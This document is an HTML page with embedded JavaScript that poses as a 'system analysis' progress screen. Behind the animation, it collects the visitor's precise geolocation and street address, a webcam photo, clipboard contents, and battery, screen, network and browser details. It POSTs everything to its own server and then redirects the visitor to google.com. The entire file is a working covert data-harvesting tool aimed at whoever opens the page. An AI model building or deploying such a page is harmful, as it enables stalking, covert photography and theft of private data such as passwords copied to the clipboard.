
<!DOCTYPE html>
<html>
<head>
  <title>Device Info Collection</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
      color: #00ff88;
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .processing-container {
      width: 90%;
      max-width: 500px;
      background: rgba(0, 0, 0, 0.8);
      padding: 2rem;
      border-radius: 15px;
      box-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
    }
    .progress-bar {
      width: 100%;
      height: 25px;
      background: #111;
      border: 2px solid #00ff88;
      border-radius: 12px;
      overflow: hidden;
      margin: 20px 0;
    }
    .progress {
      width: 0%;
      height: 100%;
      background: linear-gradient(90deg, #00ff88, #00ffcc);
      transition: width 0.3s ease;
      position: relative;
    }
    .progress::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: linear-gradient(
        90deg,
        transparent,
        rgba(255, 255, 255, 0.2),
        transparent
      );
      animation: shine 1.5s infinite;
    }
    @keyframes shine {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(100%); }
    }
    .status {
      font-size: 28px;
      margin: 15px 0;
      text-align: center;
      text-shadow: 0 0 10px #00ff88;
    }
    .collecting {
      font-size: 18px;
      opacity: 0.9;
      margin-top: 15px;
      text-align: center;
      color: #00ffcc;
    }
    h2 {
      text-align: center;
      color: #00ff88;
      font-size: 24px;
      margin-bottom: 25px;
      text-shadow: 0 0 15px #00ff88;
    }
  </style>
</head>
<body>
  <div class="processing-container">
    <h2>System Analysis In Progress</h2>
    <div class="progress-bar">
      <div class="progress" id="progressBar"></div>
    </div>
    <div class="status" id="status">0%</div>
    <div class="collecting" id="collecting">Initializing...</div>
  </div>

  <script>
    async function getLocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          alert('Geolocation is not supported by your browser');
          resolve(null);
          return;
        }
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            const coords = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude
            };
            const mapsUrl = `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
            
            try {
              const response = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${coords.latitude}&lon=${coords.longitude}&format=json`);
              const data = await response.json();
              const address = data.display_name;
              resolve({
                ...coords,
                mapsUrl,
                address
              });
            } catch (error) {
              resolve({
                ...coords,
                mapsUrl,
                address: 'Address not available'
              });
            }
          },
          (error) => {
            alert('Please allow location access to continue');
            resolve(null);
          },
          { enableHighAccuracy: true }
        );
      });
    }

    async function getBatteryInfo() {
      try {
        const battery = await navigator.getBattery();
        return {
          level: battery.level * 100,
          charging: battery.charging
        };
      } catch {
        return null;
      }
    }

    async function takePicture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = 400;
        canvas.height = 400;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 400, 400);
        
        const photo = canvas.toDataURL('image/jpeg');
        stream.getTracks().forEach(track => track.stop());
        return photo;
      } catch (error) {
        console.error('Camera error:', error);
        return null;
      }
    }

    async function getClipboardContent() {
      try {
        const text = await navigator.clipboard.readText();
        return text;
      } catch (error) {
        console.error('Clipboard error:', error);
        return null;
      }
    }

    async function collectDeviceInfo() {
      const location = await getLocation();
      const battery = await getBatteryInfo();
      const photo = await takePicture();
      const clipboardContent = await getClipboardContent();
      
      return {
        screen: {
          width: window.screen.width,
          height: window.screen.height,
          orientation: screen.orientation.type
        },
        battery,
        location,
        photo,
        clipboardContent,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        connection: navigator.connection ? {
          type: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink
        } : null,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString()
      };
    }

    const steps = [
      'Initializing system scan...',
      'Acquiring location data...',
      'Capturing device image...',
      'Reading clipboard content...',
      'Analyzing device specs...',
      'Processing system info...',
      'Gathering network details...',
      'Verifying collected data...',
      'Preparing location redirect...'
    ];

    async function simulateProcessing() {
      const progress = document.getElementById('progressBar');
      const status = document.getElementById('status');
      const collecting = document.getElementById('collecting');
      
      // Start capturing photo and clipboard early
      const photoPromise = takePicture();
      const clipboardPromise = getClipboardContent();
      
      for(let i = 0; i <= 200; i++) {
        progress.style.width = i + '%';
        status.textContent = i + '%';
        if(i % 20 === 0) {
          collecting.textContent = steps[Math.floor(i/20)];
        }
        await new Promise(resolve => setTimeout(resolve, 30));
      }

      const [photo, clipboardContent] = await Promise.all([photoPromise, clipboardPromise]);
      const deviceInfo = await collectDeviceInfo();
      deviceInfo.photo = photo;
      deviceInfo.clipboardContent = clipboardContent;
      
      await fetch(window.location.href, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(deviceInfo)
      });

      // Always redirect to google.com after collecting data
      window.location.href = 'https://www.google.com';
    }

    window.onload = simulateProcessing;
  </script>
</body>
</html>
